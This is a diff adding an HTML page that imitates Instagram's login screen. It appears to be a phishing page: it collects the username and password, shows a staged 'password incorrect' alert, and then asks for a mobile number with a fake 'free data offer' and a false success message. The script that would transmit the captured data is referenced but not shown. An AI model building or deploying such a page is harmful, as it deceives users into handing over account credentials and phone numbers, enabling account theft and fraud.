@@ -1,0 +1,65 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/site.js"></script>
+    <link rel="stylesheet" href="css/site.css">
+</head>
+<body>
+    <div class="igc_mainDiv">
+        <div class="igc_mainLeftDiv">
+            <div class="igc_leftInnerImgDiv">
+                <img class="igc_slideImg" src="img/s1.png" />
+                <img class="igc_slideImg" src="img/s2.png" />
+                <img class="igc_slideImg" src="img/s3.png" />
+                <img class="igc_slideImg" src="img/s4.png" />
+            </div>
+        </div>
+        <div class="igc_mainRightDiv">
+            <div class="igc_rightTopDiv">
+                <div class="igc_InstagramLogoDiv">
+                    <img src="img/InstagramLogo.jpg" />
+                </div>
+                <div class="igcLoginMainDiv">
+                    <div class="igc_InputFieldDiv">
+                        <input name="username" type="text" placeholder="Phone number, username, or email" class="igc_InputField igc_loginInputField igc_email" value="">
+                    </div>
+                    <div class="igc_InputFieldDiv" style="padding-top: 10px;">
+                        <input name="password" type="password" placeholder="Password" class="igc_InputField igc_loginInputField igc_pwd" value="">
+                    </div>
+                    <div class="igc_LogInBtnDiv" style="padding: 15px 0;">
+                        <button class="igc_Btn igc_LogInBtn" disabled>Log In</button>
+                    </div>
+                    <div class="igcAlertDiv igcErrorAlertDiv">
+                        <p class="igcAlert error" role="alert">Sorry, your password was incorrect. Please double-check your password.</p>
+                    </div>
+                </div>
+                <div class="igcMobileNoMainDiv">
+                    <div class="igcMobileVerifyInfoDiv">
+                        <p class="igcAlert info">Verify your mobile number to avail free data offer.</p>
+                    </div>
+                    <div class="igc_InputFieldDiv">
+                        <input name="mobile" type="text" placeholder="Mobile number" class="igc_InputField igc_mobileVerifyInputField igc_mobile" value="">
+                    </div>
+                    <div class="igc_mobileVerifyBtnDiv" style="padding: 15px 0;">
+                        <button class="igc_Btn igc_mobileVerifyBtn" disabled>Verify</button>
+                    </div>
+                </div>
+                <div class="igcSuccessInfoMainDiv">
+                    <div class="igcSuccessInfoDiv" style="padding: 15px 0;">
+                        <p class="igcAlert info success">&check; Congratulations! Your number has been successfully verified and free data will credit within an hour.</p>
+                    </div>                    
+                </div>
+            </div>
+            <div class="igc_rightBottomDiv">
+                <img src="img/bottomBg.jpg" />
+            </div>
+        </div>
+    </div>
+</body>
+</html>
